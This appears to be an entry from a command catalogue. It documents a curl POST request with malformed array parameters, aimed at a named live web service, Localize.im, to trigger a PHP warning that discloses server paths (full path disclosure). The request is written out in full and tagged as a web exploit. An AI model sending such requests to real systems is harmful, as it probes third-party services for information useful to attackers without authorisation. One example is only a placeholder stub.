---
id: cmd-curl-post-001
data: >-
  curl -X POST "https://www.localize.im/projects/[project
  ID]/languages/[Language ID]" -H "Cookie: session=your_session_cookie" -H
  "Content-Type: application/x-www-form-urlencoded" -d
  "CSRFToken=TOKEN&updatePhrases[previous][yxr][0]=&updatePhrases[edits][yy4][0]=&updatePhrases[edits][yxr][0]=&updatePhrases[previous][yxq][0]=&updatePhrases[secret]=[SecretCodes]&updatePhrases[translatorID]=[ID]&updatePhrases[edit][someID][0][]="
tags:
  - web-exploit
  - post-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:12.003Z'
verified: false
validated: true
submitted: true
---
# curl-post-malformed

## Command

```bash
curl -X POST "https://www.localize.im/projects/[project ID]/languages/[Language ID]" -H "Cookie: session=your_session_cookie" -H "Content-Type: application/x-www-form-urlencoded" -d "CSRFToken=TOKEN&updatePhrases[previous][yxr][0]=&updatePhrases[edits][yy4][0]=&updatePhrases[edits][yxr][0]=&updatePhrases[previous][yxq][0]=&updatePhrases[secret]=[SecretCodes]&updatePhrases[translatorID]=[ID]&updatePhrases[edit][someID][0][]="
```

## Description

Submits a POST request with malformed parameters to trigger FPD in Localize.im.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| URL | Target endpoint | Yes |
| `-H "Cookie: ..."` | Session auth | Yes |
| `-d` | POST data with malformed arrays | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://www.localize.im/projects/123/languages/456" -H "Cookie: session=abc" -d "CSRFToken=token&updatePhrases[edit][1][0][]="
```

### Advanced Usage

```bash
curl -v -X POST ... -d "full malformed payload"
```

## Expected Output

Response with PHP warning disclosing server path.

## Related

- [[Related Procedure]]
